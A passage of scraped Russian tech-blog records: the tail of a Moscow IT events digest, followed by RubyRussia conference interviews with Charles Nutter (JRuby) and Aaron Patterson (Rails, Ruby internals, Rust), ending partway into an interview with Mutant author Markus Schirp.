задание.\r\nСоздай лучшее ИТ-решение на основе поиска, агрегации и аналитики информации из открытых источников до 24 октября и получи приглашение на финал, который пройдёт в МГТУ им. Н.Э. Баумана 29-30 октября.\r\nСтань победителем и получи оффер на работу в нашей команде.\r\nПодробности здесь: http://supply.gazprom-neft.ru/press-center/news/38253/\\\n\nБизнес-игра \"\"Скифская лестница\"\"\n\n11 октября (четверг)\nСколково, Новая улица 100\nбесплатно\nВести бизнес на рынках, где правила игры недостаточно прозрачны, значит учиться работать с неожиданными ситуациями — быть игроком. В режиме игровых механик развивается ваше мышление, появляется возможность подумать и найти решение, как выйти на новый уровень.\n\nUnity Moscow Meetup \n\n11 октября (четверг)\nВШБИ, Трифоновcкая 57c1\nбесплатно\nТемой первого митапа будет AR/VR. Вас ждут интересные доклады, общение с профессионалами индустрии, а так же специальная демо-зона от MSI. Приглашаем обмениваться опытом использования Unity, идеями и современными подходами и заводить новые контакты.\n\nПод капотом Яндекс.Такси: С++\n\n11 октября (четверг)\nЛьва Толстого 16\nбесплатно\nСотрудники из разных команд расскажут, как поставить на конвейер разработку, тестирование и запуск в продакшн моделей машинного обучения. А ещё поделятся опытом всевозможного тестирования — ручного и автоматизированного — и объяснят, как обрабатывать позиции такси в условиях высокой нагрузки.\n\nТренинг «11 секунд»\n\n12 октября (пятница) — 13 октября (суббота)\nМосква (secret place)\nОт 17 700 (промо-код на скидку moseventsдля наших подписчиков)\nЕсли ты работаешь в event-индустрии, то знаешь, что перед организацией классного мероприятия нужно защитить свою креативную идею и тендерную презентацию.\r\nСергей Горбачев, партнер и генеральный директор агентства стратегических событий «Подъёжики» проведет двухдневный семинар с отработкой лучших практик тендерной работы.\r\nЗа 2 дня ты получишь детальную методику проработки тендера, инструменты для понимания клиентов, ключи к успешному выступлению и экспертную обратную связь.\n\nКак создать компанию-конкурента Uber и Gett?\n\n12 октября (пятница)\nМосква\nот 550 р.\nЗимой 2012 в Якутске температура воздуха опустилась ниже — 45 градусов, и местные таксисты одновременно повысили стоимость поездок по городу в два раза. В ответ жители Якутска создали в социальных сетях группу «Независимые водители», участники которой оставляли заявки на поездки и предлагали свою цену, а водители брали такие заказы. Так родилась идея inDriver.\n\nExperiment: выставка разрушенных отношений\n\n12 октября (пятница) — 13 октября (суббота)\nFlacon, Большая Новодмитровская 36\nбесплатно\nEXperiment — выставка вещей и их историй. Вещей, которые остаются после романтических отношений: случайной встречи, одной ночи, курортного романа или брака.\n\nOneTwoTrip Hackathon\n\n13 октября (суббота) — 14 октября (воскресенье)\nМосква\nбесплатно\nДля участия в мероприятии необходимо ЗАРЕГИСТРИРОВАТЬСЯ до конца дня 9-го октября и пройти отбор.\r\nВ течение двух выходных дней (13 и 14 октября) мы предлагаем дизайнерам, разработчикам, product-менеджерам, специалистам в e-commerce и связанных областях принять участие в разработке новых продуктов и побороться за призовой фонд в 300 000 рублей, который будет распределён между тремя местами (150 000 руб., 100 000 руб. и 50 000 руб. соответственно).", {"day": "8", "month": "октября", "time": "05:48"}, {"rate": 2, "views": 987}], ["Через пару дней в Москве пройдет конференция RubyRussia. Наш гость Чарльз Наттер (работает над JRuby и JVM поддержкой в Red Hat) ответил на пару вопросов.\n\nКак вы попали в мир программирования и Ruby?\n\r\nВ 2004 году я работал по контракту в правительственной фирме в качестве Java Enterprise архитектора. Я работал над проектом для Министерства сельского хозяйства США, и проводил пару недель в месяц в Вашингтоне. Одна из таких поездок совпала с RubyConf 2004, и поскольку один из моих друзей давно рекомендовал мне обратить внимание на Ruby, я решил сходить на конференцию. Так я оказался на мероприятии, посвященном Ruby, не имея никакого представления об этом языке… но я понял каждый кусочек кода, каждый приведенный пример. Я был поражен и пообещал себе найти способ принести Ruby в мой Java-мир.\n\nНад какими проектами вы работаете сейчас?\n\r\nЯ один из двух руководителей проекта JRuby. В эту работу входят и разные связанные проекты, например, поддержка нативных библиотек (мы поддерживаем Ruby FFI на JRuby), или перекодировка строк (портирование аналогичной логики из CRuby). Кроме того, я работаю с сообществом, чтобы быть уверенным, что наши пользователи всегда могут получить от нас помощь. В общем, работы всегда полно!\n\nУ какого из этих проектов самое яркое будущее?\n\r\nДумаю, что это JRuby, хотя это и не самый популярный язык на платформе JVM.\r\nПо крайней мере, мы поспособствовали позитивным изменениям в самой JVM. Во многом благодаря нашему сотрудничеству с Sun Microsystems и Oracle, сейчас JVM стал удобной платформой для многих динамических языков, не только Java. Я надеюсь, что мы сыграли не последнюю роль в этом изменении.\n\nНа каких языках вы пишете чаще всего? Какой из них вам нравится больше всего и почему?\n\r\nЯ в основном пишу на Ruby и Java, так как JRuby написан с использованием обоих. Каждый из этих языков хорошо подходит для своих задач. Ruby — для создания приложений, которым необходимо быстро развиваться и адаптироваться. Java — для написания высокоскоростных, надежных библиотек и сервисов. А JRuby сочетает в себе лучшее из обоих миров!\n\nВам нравится программировать на Java?\n\r\nДа, особенно, если учесть все недавно добавленные улучшения языка, такие как лямбды (замыкания или блоки в Ruby), и новый синтаксис для объявления локальных переменных (var), когда статический тип однозначен.\n\nА что Вы думаете о Rust?\n\r\nRust — отличный язык! В колледже я много использовал C ++, но я могу однозначно сказать, что, если бы в то время я знал Rust, я предпочел бы писать на нем. Мне особенно нравится статически-типизированная модель владения, которая позволяет писать стабильные параллельные программы, и гарантирует безопасный доступ к памяти. Думаю, другим языкам стоит перенять это в будущем.\n\nКакие у вас мысли по поводу перспектив Ruby? Многие годы многие считают, что язык и его сообщество «умирают»...\n\r\nПосле многих лет работы над JRuby, я полюбил синтаксис Ruby, и то, как вообще все в нем устроено. Но, боюсь, что проблема производительности реально существует и является важной. JRuby борется за то, чтобы сделать параллельные потоки реальностью для Ruby разработчиков, но, до сих пор, подавляющее большинство Ruby сервисов используют несколько изолированных процессов, тратя огромное количество и ресурсов процессора и памяти. Думаю, это связано со слишком масштабным и инвазивным C API для написания расширений Ruby, которое не позволяет внедрить такие улучшения, как параллельные потоки.\r\nНо я не теряю надежды, что однажды мы все же увидим изменения.\n\nКак вы думаете, какие из не самых популярных фич Ruby должны завоевать внимание в будущем?\n\r\nЯ с нетерпением жду, когда строки станут иммутабельными по умолчанию, как это происходит в большинстве других языков. Параллельное программирование было бы намного проще, если бы больше объектов Ruby можно было бы сделать полностью неизменяемыми (deeply frozen). Это может напоминать модель, используемую в Rust… если вы делитесь объектом в потоках, следует выбирать ту версию объекта, которая точно не будет модифицирована. Это распространяется на массивы, хэши и практически на любой другой изменяемый объект в Ruby: нам необходимо упростить блокировку изменения данных.\n\nУ меня есть большой старый монолитный проект на Ruby. Я подумал — а не перевести ли его на JRuby. Как это можно было бы сделать, и имеет ли это вообще смысл?\n\r\nПервый вопрос, на самом деле, заключается в том, поможет ли вам такой шаг.\r\nВескими аргументами за переход на JRuby могли бы быть:\n\n\nСокращение затрат ресурсов, когда есть их недостаток, например, если на одном сервере хостятся сразу несколько приложений\nРазвертывание приложения Ruby в JVM-нагруженной среде, которая используется в крупных финансовых и правительственных организациях\nНеобходимость доступа к библиотекам, которые существуют только на Java, или которые проще портировать на JVM, чем их эквиваленты в Ruby или C\nНебольшое повышение производительности в приложениях с тяжелыми вычислениями (которые грузят процессор) или с большим количеством параллельно выполняющихся задач.\n\r\nЯ бы сказал, что если приложение масштабируется хорошо и не слишком дорого вам обходится, то возможно, вам не стоит ничего предпринимать. Но если вы решите получить от Ruby больше, то вот процесс миграции:\n\n\nСоберите воедино все сторонние библиотеки, которые использует ваше приложение. \nВыделите среди них те, которые используют С-расширения. \nДля каждого расширения найдите эквивалент JRuby. У нас есть несколько\nстраниц в JRuby вики об этом. Самые популярные библиотеки имеют JRuby версии. Если же JRuby версий не находится, то можно использовать чистую Ruby версию (она будет достаточно быстрой на JRuby) или JVM-библиотеки (в Java, Scala, Clojure и т.п.), которые могут быть использованы в качестве замены.\nКак только все ваши гемы заработали на JRuby — заработает и все приложение! Мы очень много внимания уделяем совместимости и стараемся принимать во внимание новые проблемы, на которые обращают внимание наши пользователи. Поэтому с большой вероятностью если у вас собрался bundle на JRuby — то приложение заработает.\n\r\nНу а дальше начинается самое сложное — что делать с освободившимися ресурсами. На сколько потоков распараллелить приложение, как потратить сэкономленные деньги… :)\n\nЧто сейчас необходимо знать студентам, чтобы стать хорошими программистами?\n\r\nКогда я учился в университете, на моих курсах по информатике преподавался язык Scheme, функциональный язык, подобный Lisp, который отлично подходил для обучения основам программирования. Я по-прежнему рекомендую начинающим программистам изучить хотя бы часть книги Structure and Interpretation of Computer Programs, изданной Массачусетским технологическим институтом (MIT). Ну и в целом, чем больше разных языков вы знаете, тем лучше. Это дает новые идеи, и позволяет взглянуть на решение ваших задач под разными углами.\n\nГде вы черпаете мотивацию для работы? Сталкивались ли вы с проблемой профессионального выгорания?\n\r\nВыгорание — это настоящая проблема в нашей отрасли. Особенно работа в open source\r\nприносит с собой огромное количество стресса. Думаю, это случалось со всеми… когда слишком много работы, не успеваешь все сделать, жертвуешь временем с семьей и друзьями, забываешь о здоровье, ради того, чтобы исправить еще один очередной баг. Чтобы бороться с этим, я стараюсь уделять внимание на хобби: играть в компьютерные и настольные игры, учиться играть на гитаре,\r\nизучать иностранные языки и путешествовать по миру, встречать новых людей. Во мне всегда будет жить ворчащий трудоголик, уговаривающий меня вернуться к работе, но я все же стараюсь поддерживать правильный баланс.\n\nКаково ваше мнение о России, и что вы ожидаете от предстоящего мероприятия RubyRussia?\n\r\nЯ люблю Россию, и все мои поездки на конференции сюда за последние несколько лет были очень полезными. Это будет мой четвертый визит, ранее я был в Санкт-Петербурге, Москве и даже в Новосибирске (!!!). Я с нетерпением жду возвращения в Москву и встречи с российским Ruby-сообществом, о котором я весьма наслышан.\n\r\nВопросы подготовил Дмитрий Матвеев, PM в компании Evrone. А задать свой вопрос можно будет уже 6 октября. Так что увидимся на конференции! Все подробности на сайте.\n\r\nПрочитать оригинал на английском можно на hype.codes.\n\r\nИ огромное спасибо компаниям, которые подерживают главное Ruby-событие в России:\n\r\nГенеральный партнер — Toptal\r\nЗолотые партнеры — Gett и Cookpad\r\nСеребярные партнеры — Instamart, UCHi.ru, JetBrains и Qlean\r\nПартнер афтепати — Teachbase\r\nБронзовые партнеры — Bookmate и InSales", {"day": "4", "month": "октября", "time": "20:15"}, {"rate": 10, "views": 2100}], ["Привет! Продолжаем серию интервью со спикерами конференции RubyRussia. Аарон Паттерсон (он же tenderlove) — член Ruby core team и Rails core team, ведущий инженер-программист в маленьком стартапе под названием GitHub. Павел Аргентов пообщался с Аароном перед его второй поездкой в Россию.\n\n\n\nНачнем со стандартного вопроса. Какова твоя личная ruby-история? Как ты сел на этот поезд? Расскажи про свои достижения? Получилось ли сделать мир лучше?\n\r\nRuby я открыл для себя в 2006-м году. Я тогда был Java-программистом. Начнем даже раньше: я был программистом на Perl, а затем стал программистом на Java, но джавистом я быть не хотел.\n\nПочему?\n\r\nКогда я писал на Perl, у нас уже был собственный веб-фреймоворк. Было много того, что есть в Rails: можно было просто менять код, перезагружать страницу и проверять, что вышло. Все просто работало. Когда мы перешли на Java-разработку, стало так: нужно все перекомпилировать — пройдет 10 минут, прежде чем можно будет проверить все только что сделанные изменения. Мне нравятся динамические языки, такие как Perl, больше, чем Java. Ожидался выход Perl 6. И вот, пока я ждал Perl 6, я узнал о Ruby. Подумал: «Ничего себе! Вот то, что мне нужно!» Так я и начал заниматься Ruby — в свободное время, например, для сайд-проектов. Ну знаешь, просто ради фана. С этого все начиналось. Наконец, в 2008 году я уже получил на Ruby работу.\n\nЭто уже были Rails?\n\r\nДа, мой приятель решил начать стартап. — Мы будем использовать Rails. Хочешь работать с нами в одной компании? Я такой: — Да, конечно, с удовольствием буду работать на “рельсах”! Вот так я и начал.\n\r\nЧестно говоря, мне не нравилась моя работа в этой компании. Поэтому при любом удобном случае прямо на рабочем месте я писал опенсорс. Это делалось так: — Ок, проект займет 2 дня. Потом я заканчивал дело за пару часов, а остаток времени использовал для опенсорса.\n\nТо, что у нас называется: «Не бей лежачего!» Я сижу здесь спокойно, починяю примус. Оставьте меня, плиз, в покое!\n\r\nАга! Итак, тут я начал много работать с опенсорсом. На этой работе я начал писать Nokogiri и вообще работать над своим Ruby-опенсорсом. Так я вообще вошел в опенсорс. Просто “вносил посильный вклад”, пока однажды не вступил в команды Ruby Core и Rails Core.\n\nТак как же ты ты в конечном итоге оказался в Rails Core Team?\n\r\nМы просто находили ошибки и разрабатывали Rails-приложения. Находили баги, я их исправлял и отсылал патчи. Я просто слал патчи. В конце концов, они устали от того, что я просто гоню пулл-реквесты.\n\nТипа, теперь бери дело в свои руки, да?\n\r\nДа, точно! В целом это было как brute force атака!\n\nЗвучит разумно! Так каков твой общий вклад в Rails?\n\r\nЯ много работал практически над всеми частями фреймворка. В основном — над Active Record. Особенно мне нравится делать багфиксы и улучшать производительность. Причина такой привязанности — это делает чьи-то приложения лучше. Все рады, если приложение станет лучше, а для этого не нужно ничего делать. Вот почему мне нравится на это работать.\n\nТы делаешь какие-то «небольшие» доводки, которые заставляют все работать. А «большие» вещи архитектурировать не приходилось?\n\r\nОбычно всякий раз, когда я делаю в Rails что-то архитектурное, это что-то внутри. Например, архитектура работы c URL, ассоциациями, штуковины внутри маршрутизатора — как-то так. Ни одна из этих вещей не будет обязательно заметна. Они могут быть замечены пользователем, но это не в виде: “Вот она, настоящая Вещь!” Я стараюсь придерживаться такого стиля. Думаю, что на самом деле это хорошо, потому что Дэвиду (DHH — П.А.) нравится делать Новые Блестящие Прекрасные Фичи. Я, скорее, говорю про себя: «Ну ладно, сделаем эти твои Прекрасные Фичи. Глядишь, и правда выйдут прекрасные!»\n\nДа, кто-то должен делать всю ручную работу. Вот например, твоя презентация на конференции будет про определенные глубокие инженерные части Ruby вообще и Rails в частности. О чем презентация на самом деле?\n\r\nНа самом деле я расскажу о внутренностях Ruby. До конца еще всю речь не выдумал.\n\nGC, производительность, все такое, жизнь, вселенная, 42?\n\r\nДумаю поговорить о сборщике мусора, процессе компиляции Ruby и байт-коде. В основном, о байт-коде в виртуальной машине и о том, как это относится к сборщику мусора. О некоторых улучшениях производительности, которые я сделал в GC. Не предполагаю много рассказывать о Rails.\n\nНаша конференция раньше называлась «Rails Club». Наши организаторы подумали, да и переименовали всю затею в основном из-за того, что Мац заявил, что он никогда не посещает конференции со словом “Rails” в названии. Итак, теперь мы «Ruby Russia»!\n\r\nИтак, я буду говорить о внутренностях Ruby!\n\nНа твой взгляд, что должны делать программисты на Rails для достижения лучшей производительности в своем коде?\n\r\nСуществует несколько стратегий. Первая, общими словами, — не делай ничего особенного. Просто пиши свое приложение. Запусти его, получи клиентов, обратную связь и т.д. Сразу проанализируй обнаруженные узкие места. Никогда не работай с узкими местами, пока реальная работа с клиентами их не выявит. Если ты занимаешься узкими местами, которые на самом деле таковыми не являются, это напрасная трата времени. Это время можно было бы использовать для новых фич. Однако думаю, многие сказали бы то же самое, так что давай поговорим о том, что реально влияет на производительность. Во-первых, просто посмотри на запросы к базе данных, которые делает страница. Это первая линия обороны — старайся сократить время, затрачиваемое на определенные запросы. Сами запросы — автоматизировать и сокращать. Ты не поверишь, как часто мы забываем просто добавить индекс. Ха! Итак, сделай хотя бы индекс в нужном месте.\n\nЯ провожу технические собеседования и представляю, как люди забывают даже о том, что такое индексы вообще. Почему вообще нужно беспокоиться об этом… Хорошо, а что ты ты скажешь на предмет других вещей, которые должны знать рубисты? Какие технические штуки рубисту следует знать, чтобы лучше выполнять свою работу?\n\r\nЕсть пара таких штук. Первая из них, я думаю, это знать сам язык Ruby. Изучите язык очень тщательно. Вторая — хорошо разобраться в UNIX.\n\nТы первый «мой» спикер, который говорит, что надо знать UNIX. Вот лично я пришел в Ruby из мира UNIX. Я занимался Linux, FreeBSD и тоннами кода на Perl. Я пришел к Ruby, как к еще одному Perl-у, чтобы делать свои сисадминские дела, и только потом обнаружил, что это еще и веб-язык. И вот, ты говоришь, что надо знать UNIX. Как и почему?\n\r\nВажно изучать стандарты POSIX и о то, как они взаимодействуют с операционной системой, потому что ты столкнешься с этим, как только начнешь масштабирование. Ты…\n\n… должен знать, кто такой Генерал Фейлер и почему он читает мой файл?\n\r\nХа-ха, да! Нужно знать, что меняет производительность. Возможно, не надо специально заучивать это наизусть, но следует знать, что они (системные вызовы — П.А.) существуют, и как их гуглить, потому что с этим хозяйством обязательно столкнешься. Они будут иметь значение, потому что приложение развертывается на сервере UNIX, поэтому нужно понимать, как приложение будет взаимодействовать с ОС, на которой оно будет запущено. Другой важный момент состоит в том, что если ты получил этот навык в UNIX, ты можешь применить их, например, в других языках. Если возникнут какие-либо проблемы, всегда можно начать с этого места. Это, пожалуй, главное, что я рекомендую программистам изучать.\n\nКак думаешь, полезно ли рубисту знать какой-нибудь другой язык? Возможно ли быть хорошим программистом в Ruby, не зная ничего вне пределов Ruby?\n\r\nХороший вопрос. Честно говоря, я не знаю. Все известные мне хорошие рубисты знают другие языки. Однако я не знаю, нужно ли обязательно изучать другие языки, чтобы стать хорошим программистом на Ruby. Я думаю, что просто так бывает, что люди учатся другим языкам.\n\nХорошее наблюдение! С медицинской точки зрения, чем больше языков знает человек, тем сильнее это оттягивает наступление его Альцгеймера.\n\r\nХа-ха!\n\nПосле 40 приходится думать о таких вещах...\n\r\nЯ приближаюсь к 40 годам! Мне это знать полезно!\n\nДавай поговорим о самом Ruby. Ruby — это язык с великим прошлым. А есть ли у него будущее? Не так давно я был в Санкт-Петербурге на одной из крупнейших ИТ-конференций, виданных мной в России. Местное руби-сообщество на этой конференции представлено не было. Мне постоянно приходилось «Ruby-апологетикой»: Ruby НЕ НАСТОЛЬКО мертв, на Ruby все еще пишут. У Ruby есть, между прочим, лучший из известных веб-фреймворков — и все такое. У каждого большого языка на рынке сейчас есть какие-то инструменты для веб-разработки. Go, Rust, что угодно. Каково место Ruby в этой экосистеме и имеет ли «Ruby с большим прошлым» будущее?\n\r\nЯ думаю, есть несколько аспектов ответа на этот вопрос. Есть много разных языков, для которых есть веб-фреймворки, но я все же считаю, что если посмотреть на них с точки зрения эргономики разработчика, Ruby в любом случае окажется в топе. Его легко использовать, и легко продать результат. Проблема в том, что Руби уже не «новенький и блестящий». Люди хотят увлечься чем-то новым. Они хотят сесть на следующий после Rails поезд.\n\nХотят запаха новой машины!\n\r\nДа! О будущем… В Ruby появилось много новых разработок, особенно это про JIT и то, с чем работает Koichi: guilds. Я бы сказал, что у Ruby определенно есть будущее, но для этого всем придется поработать. Если мы приложим должные усилия, будущее обязательно будет.\n\nИмеет ли Ruby какую-либо перспективу в других областях, помимо веб-разработки? Или ты знаешь какие-нибудь примеры, где сейчас Ruby используется за пределами веб-разработки?\n\r\nХороший вопрос! Трудно ответить, потому что я занимаюсь только проблемами веб-разработки.\n\nЯ спрашиваю, потому что это мой личный интерес. Ребята из Python-сообщества, например, любят хвастаться своими успехами в научных вычислениях.\n\r\nЯ знаю, что есть группа, работающая над научными инструментами в Ruby. Но я думаю, что реальным альтернативным вариантом для Ruby является системное администрирование.\n\nКак мы можем привлечь к нашему сообществу разработчиков из других языков?\n\r\nВот это действительно хороший вопрос! Я думаю, нам просто нужно сосредоточиться на эргономике разработки, на том, что делает разработку веб-приложений максимально легкой. Нужно сосредоточиться на снижении порога входа для новых разработчиков, которые поднимаются на борт и пишут веб-приложения. Так мы привлечем больше новых программистов.\n\nПришло время холиварного вопроса, о JavaScript. Знаешь, есть поговорка: «все, что можно переписать на JavaScript, будет обязательно переписано на JavaScript». Считаешь ли ты, что Rails также будут переписаны на JavaScript? Мы говорили об эргономике разработки Ruby. Это лучшее, что есть в Rails. Один из очень известных российских программистов сказал, что «многие языки хороши, но только у Ruby есть Rails». Однако JavaScript-разработчики склонны подвергать это сомнению. Как мы можем конкурировать с JavaScript? Или нам следует устроить с ним симбиоз?\n\r\nЭто правда, что только у Ruby есть Rails. Если посмотреть на веб-фреймворки для JavaScript, я не думаю, что они достаточно сравнимы с Rails с точки зрения эргономики разработки. Дело в том, что, поскольку мы пишем веб-приложения, нам придется работать с JavaScript. Мы должны быть частью сообщества JavaScript. Нам полезно иметь симбиоз. Если на сервере можно запустить любой язык, почему это должен быть именно JavaScript? Но язык хорош, и я думаю, нам нужно работать симбиотически. Удобство разработки все еще на нашей стороне, и оно особенно ценится в Rails-сообществе. Итак, ты пришел на IT-конференцию, и тебе пришлось там работать представителем Ruby?\n\nЭто было довольно неформально, потому что у меня даже не было футболки про мою компанию или язык. Поэтому я просто нашел самую яркую группу молодых людей, которые оказались питонистами, и мы начали болтать.\n\r\nДля нас же польза, если мы будем работать вместе с другими языками, а не соперничать с ними. Лично я считаю, что программирование на Ruby намного проще и приятнее, чем на других языках. Почему нет? Мы говорим о других языках программирования и должны ли мы их знать. Я считаю, важно, чтобы рубисты изучали другие языки. Какие-нибудь вроде Java, Haskell или что-нибудь еще функциональное типа Elixir или Lisp, что-нибудь такое. Думаю, полезно изучать разные парадигмы, потому что, узнавая новое, ты можешь утащить это и использовать на своем языке. Хорошим свойством Ruby является то, что мы можем использовать в наших программах техники из различных языков.\n\nДа, у нас есть, например, инструменты для функционального программирования или выполнения map/reduce или чего-нибудь-еще.\n\r\nДа, мы можем все это использовать. Если используешь язык, который поощряет эти приемы, возможно, ты найдешь лучший способ решить поставленную задачу. Я не уверен, что прям вот нужно изучать другие языки, чтобы быть хорошим рубистом, но мне это изучение точно помогает. Честно говоря, я трачу 50% своего времени на программирование на Си.\n\nСи делает пальцы сильнее!\n\r\nЯ программирую на Си, чтобы другие могли программировать на Ruby.\n\nВнутренности Ruby написаны на чистом Си, не ++?\n\r\nНа чистом. Было бы неплохо, если бы больше этого кода было написано на Ruby, но, честно говоря, некоторые из основных вещей из соображения производительности нужно писать именно на Си. Одна из вещей, которыми я занимаюсь… Нам нужно улучшение профилирования памяти. Поэтому я работаю над инструментами профилирования памяти в Ruby. Поскольку все внутренности написаны на Си, мне приходится и инструменты писать на Си. На работе я пишу много сишного кода.\n\nКак дела у Ruby с FFI и тому подобным?\n\r\nFFI работает достаточно хорошо, если у тебя в работе библиотека на Си, в которой нужны одна-две функции. Если что-то сложнее… То все сложнее. Когда работаешь с FFI, ты в основном пишешь код на Си, который похож на Ruby. Однако все равно придется делать такие загадочные вещи, как управление памятью. Я лично нахожу, что между этими мирами легче переключаться, если используешь Си для управления памятью и т.д. А в остальных случаях переключаюсь на Ruby.\n\nВ Ruby у нас есть интерфейсы к другим языкам?\n\r\nНекоторые интерфейсы с JavaScript. Я видел парня, который занимался научными задачами, поэтому он интерфейсил с Python.\n\nОн взаимодействовал непосредственно с рантаймом языка?\n\r\nДа, именно. Не типа шеллинга или чего-то в этом роде… Проект еще очень экспериментальный. Когда он дает демоверсии, он говорит, что «все работает, но может и упасть!»\n\nЯ знаю кучу известных рубистов, которые пошли создавать Rust. Почему, по-твоему, люди этим занялись, и как у них идут дела?\n\r\nМне нравится Rust, думаю, что это очень хороший язык. Причина, по которой люди идут в Rust… они хотят иметь язык, который имеет больше возможностей защиты, чем дает Си. Было бы действительно потрясающе переписать Ruby на Rust. Я лично большой поклонник Rust, люблю его.\n\nЧем он может быть полезен? Он безопаснее, быстрее или как?\n\r\nДумаю, безопаснее. Я не уверен, сильнее ли он оптимизирован, чем, чем Си, но он определенно безопаснее. Это то, что мне в нем нравится. Когда я пишу Си-код, я почти уверен, что он не SEGV-нется, но уверен не на все 100%. Но когда я пишу на Rust, я уверен гораздо больше. Когда я пишу на Си, я почти уверен, что не будет утечки памяти. С Rust ясно как белый день, что утечки памяти не будет. Вот почему мне лично предпочтителен Rust, а не Си. Еще я начал изучать Rust, потому что хочу писать на нем расширения для Ruby. Есть целый проект под названием «Helix» — специально для этого. Часто, когда я пишу на Си, это как бы: «ОК, у меня есть библиотека на Си, и я должен получить к ней доступ из Ruby, написав пару костылей». Использовать Rust для такого — это пушка по воробьям. В моем идеальном мире все, вся система однажды будет переписана на Rust. Rust будет нашим новым Си. Если тебе нужно быстро решить проблему, ты пишешь на Ruby. А операционная система будет сделана на Rust. И всем будет щастье.\n\nДостаточно ли Rust зрел для этого?\n\r\nНу, не знаю. Думаю, вполне. В Mozilla им пользуются — и довольны.\n\nКаков шанс «увидеть регистры», запустив программу на Rust?\n\r\nХа-ха, не знаю! Надеюсь, низкий! Увидеть такое совсем не смешно.\n\nОсобенно, когда запускаешь что-то в браузере.\n\r\nДа. Выскакивает сообщение о креше, и ты такой: «ОК». Ха! У нас на работе есть некоторые штуки на C++, и иногда, когда я получаю сбои, я просто такой: «Хм...»\n\nЯ хочу программировать на языке, а не на макроассемблере! — это была моя любимая шутка, когда я переключился с Си на Ruby...\n\r\nНа самом деле ты прав. Всякий раз, когда я пишу на Си, стоит вопрос, о чем я должен задумываться. Я в самом деле не думаю о решаемой задаче. С Ruby мне не нужно думать обо всем этом (низкоуровневом хозяйстве — П.А.). Я просто сосредоточен на логике программы, и я делаю дело. Вот одна из причин, по которой я так сильно люблю Ruby! Когда я был джавистом во времена Java 1.3, это было еще до того, как там появились дженерики. Каждый раз, когда приходилось писать что-то вроде map — например, коллекции или итераторы, надо было сделать «iterator.next()», а потом кастить полученное значение… Только затем выполняешь нужную операцию. Потом я начал изучать Ruby, там map уже был как в Perl…\n\n… О, чудо! У меня прямо в руках есть объект точно того типа, который мне нужен!\n\r\nДа, точно. В Java мне пришлось бы написать строк 15 кода, чтобы добиться того, что я могу сделать одной строкой в ​​Ruby. Писал бы на Ruby, закончил бы работу намного быстрее! Вместо того, чтобы писать всю эту дрянь! Понимание этого очень расстраивало меня на той работе. Я тратил часы на лишние движения!\n\nЭкзистенциальный ужас!\n\r\nИменно! Это был поворотный момент. Мне нужно было найти работу на Ruby. Я не могу пилить яву до конца своей жизни!\n\nМожно ли утверждать, что Ruby улучшает ум программиста?\n\r\nЯ думаю, что если ты сможешь больше времени уделять задачам высокого уровня, самим целям программы, это поможет улучшить абстрактное мышление. Ты все больше упражняешься в размышлении о системе в целом, а не о крошечных винтиках программы. Напомню, в Си я должен постоянно думать обо всех этих мелочах, а не о проблеме, которую решаю. По сути, обучаешься именно Решению Проблем, то есть, задач верхнего уровня. Думаю, это может улучшить тебя как программиста.\n\nЯ помню свое собственное впечатление, когда я начинал в 90-е годы. Я попытался освоить ООП. Пробовал заняться C++. Читал книги, выучил «святую троицу ООП». И затем я снова обнаруживаю себя в процессе освоения все тех же «макроассемблерных» трюков. Потом я попытался поработать на Java, заработал немного денег на Perl. И только в Ruby я наконец понял, как работает ООП.\n\r\nДело говоришь. Если подумать о других ООП-языках, таких как C++ или Java, то в них не все есть объект. Например, все еще есть просто ints. Все еще есть примитивы, а с ними приходится иметь дело иначе, чем с объектами. В Ruby на самом деле все — объект. Приходится заниматься только ООП. Больше упражнений, больше смысла. Я действительно не сильно задумывался об этом, пока ты не спросил.\n\nЯзык разработан так аккуратно, что он просто заставляет думать в нужном направлении. Это формирует разум. Синтаксис сам объясняет, что ты делаешь.\n\r\nЯ работал с OOП в Perl. Это, в целом, как бы просто хак для OOП-подобных вещей. Java, конечно же, реализует OOП. Но у нее среди прочего есть не-объекты. Ruby в нашем списке — первый язык, на котором все действительно является объектом.\n\nКакими словами ты воодушевил бы и молодых программистов, и старых?\n\r\nХороший вопрос! Думаю, вот что подойдет для молодых и старых рубистов: Лично я считаю, что Ruby — единственный язык, который при использовании дает фан. Молодые программисты, которые уже освоили другие языки, попробуйте Ruby, потому что это реально весело. Старые программисты, имеющие солидный опыт в других языках, вы сможете все сравнить и понять, насколько Ruby хорош. Когда вы станете использовать что-то другое, вы скажете себе: вау, а Ruby-то ничего!\n\nПо выходным я занимаюсь небольшими упражнениями на других языках. После выходных возвращаюсь к работе, открываю свой Emacs с Ruby, и говорю себе: «О боже, как прекрасно вернуться на родину!»\n\r\nДа, думаю, что это хорошо — переходить на другие языки, поработать там, накопить некоторые наблюдения. Мне всегда приятно возвращаться. Я чувствую, что в Ruby я у себя дома.\n\r\nЗадать Аарону свои вопросы лично можно будет уже 6 октября. Так что увидимся на конференции! Все подробности на сайте.\n\r\nПрочитать оригинал на английском можно на hype.codes.\n\r\nИ огромное спасибо компаниям, которые подерживают главное Ruby-событие в России:\n\r\nГенеральный партнер — Toptal\r\nЗолотые партнеры — Gett и Cookpad\r\nСеребярные партнеры — Instamart, UCHi.ru, JetBrains и Qlean\r\nПартнер афтепати — Teachbase\r\nБронзовые партнеры — Bookmate и InSales", {"day": "28", "month": "сентября", "time": "18:18"}, {"rate": 20, "views": 2200}], ["Всем привет! Чуть больше, чем через неделю в Москве пройдет конференция RubyRussia. В сегодняшнем интервью разработчик из Evrone Михаил Моргунов пообщался с одним из наших спикеров — Маркусом Ширпом, создателем популярного инструмента Ruby Mutation Testing.\n\n\nПервый вопрос — про Mutant. Что нам нужно знать об этом инструменте? О чем будет доклад на RubyRussia?\n\r\nЯ расскажу историю создания инструмента для мутационного тестирования — Mutant. Хочу познакомить аудиторию с ключевыми понятиями: люди узнают о разных уровнях покрытия, их значении и ценности.\n\r\nЭто прольет свет на те вещи в Ruby, к которым мы привыкли и считаем правильными, но на самом деле в них есть проблемы. Потому что Ruby очень часто дает нам прекрасную возможность выстрелить себе в ногу.\n\nКак ты начал разрабатывать Mutant?\n\r\nЭта история связана с моей работой над DataMapper и его следующей реализацией DataMapper 2, которая в итоге стала называться ROM. Проджектлид Dan Kubb написал библиотеку реляционной алгебры под названием axiom для поддержки этих новых разработок. Когда он писал axiom, то использовал стратегию «разработки с ограничениями». Она включает в себя много инструментов для работы с метриками и мутационное тестирование.\n\r\nИнструмент, который мы тогда использовали для мутационного тестирования, назывался Hackle. У него были определенные операционные и концептуальные недостатки. Однажды я подумал: «Черт возьми, не буду даже пытаться исправить его! Давайте просто напишем новый и решим все проблемы масштабирования мутационного тестирования, которые есть у нас в 